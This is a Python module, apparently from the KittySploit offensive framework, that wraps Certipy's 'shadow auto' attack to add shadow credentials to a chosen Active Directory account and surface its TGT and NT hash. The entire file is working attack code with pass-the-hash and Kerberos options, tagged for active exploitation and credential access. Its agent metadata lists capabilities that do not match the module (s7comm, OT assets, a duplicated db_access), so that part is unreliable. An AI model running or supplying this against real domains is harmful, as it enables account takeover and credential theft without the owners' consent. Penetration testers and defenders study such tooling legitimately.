#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import shlex
import shutil
import subprocess

from kittysploit import *


class Module(Post):
    __info__ = {
        "name": "AD Shadow Credentials Auto",
        "description": "Runs Certipy shadow auto against an account and surfaces the resulting TGT/NT hash output.",
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "tags": ["ad", "ldap", "shadow-credentials", "pkinit", "certipy", "post"],
        "references": [
            "https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab",
            "https://github.com/ly4k/Certipy",
        ],
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation', 'credential_access', 'account_modification'],
        'expected_requests': 3,
        'reversible': False,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    session_id = OptString("", "Session ID (unused; this module runs local AD tooling)", False, advanced=True)

    certipy_binary = OptString("certipy-ad", "Certipy executable name/path (certipy-ad or certipy)", True)
    domain = OptString("example.local", "AD domain/FQDN", True)
    username = OptString("", "Authenticating user (without domain unless username_is_upn=true)", True)
    password = OptString("", "Password; empty when using Kerberos ccache or hashes", False)
    nt_hash = OptString("", "NT hash for pass-the-hash auth; empty to use password/ccache", False)
    target = OptString("", "Domain controller hostname for Certipy -target", True)
    dc_ip = OptString("", "Domain controller IP for -dc-ip", False)
    account = OptString("", "Target account to add shadow credentials to", True)
    use_kerberos = OptBool(True, "Use Kerberos (-k)", False)
    no_pass = OptBool(False, "Pass -no-pass to Certipy", False)
    kccache = OptString("", "Optional KRB5CCNAME ccache path", False)
    cleanup = OptBool(True, "Let Certipy restore/remove the KeyCredential after auto auth", False)
    dry_run = OptBool(False, "Only print the command that would run", False)
    timeout = OptInteger(180, "Command timeout in seconds", False, advanced=True)

    @staticmethod
    def _value(opt) -> str:
        return str(opt.value if hasattr(opt, "value") else opt or "")

    def _certipy(self) -> str:
        binary = self._value(self.certipy_binary).strip() or "certipy-ad"
        resolved = shutil.which(binary) if os.path.basename(binary) == binary else binary
        if not resolved:
            raise ProcedureError(FailureType.NotFound, f"{binary!r} not found in PATH")
        return resolved

    def _build_argv(self):
        domain = self._value(self.domain).strip()
        user = self._value(self.username).strip()
        principal = user if "@" in user else f"{user}@{domain}"
        argv = [
            self._certipy(),
            "shadow",
            "auto",
            "-username",
            principal,
            "-target",
            self._value(self.target).strip(),
            "-account",
            self._value(self.account).strip(),
        ]
        if self._value(self.dc_ip).strip():
            argv.extend(["-dc-ip", self._value(self.dc_ip).strip()])
        if bool(self.use_kerberos):
            argv.append("-k")
        if bool(self.no_pass):
            argv.append("-no-pass")
        if self._value(self.password):
            argv.extend(["-p", self._value(self.password)])
        if self._value(self.nt_hash):
            argv.extend(["-hashes", ":" + self._value(self.nt_hash).lstrip(":")])
        if not bool(self.cleanup):
            argv.append("-no-cleanup")
        return argv

    def run(self):
        argv = self._build_argv()
        env = os.environ.copy()
        if self._value(self.kccache).strip():
            env["KRB5CCNAME"] = self._value(self.kccache).strip()

        printable = " ".join(shlex.quote(x) for x in argv)
        if env.get("KRB5CCNAME"):
            printable = f"KRB5CCNAME={shlex.quote(env['KRB5CCNAME'])} {printable}"
        print_info(printable)
        if bool(self.dry_run):
            print_warning("dry_run=true; command was not executed")
            return True

        try:
            proc = subprocess.run(
                argv,
                env=env,
                capture_output=True,
                text=True,
                timeout=max(int(self.timeout or 180), 1),
                check=False,
            )
        except subprocess.TimeoutExpired:
            print_error("Certipy shadow command timed out")
            return False

        output = ((proc.stdout or "") + ("\n" + proc.stderr if proc.stderr else "")).strip()
        if output:
            print_info(output[:20000])
        if proc.returncode == 0:
            print_success("Certipy shadow auto completed")
            return True
        print_error(f"Certipy exited with status {proc.returncode}")
        return False
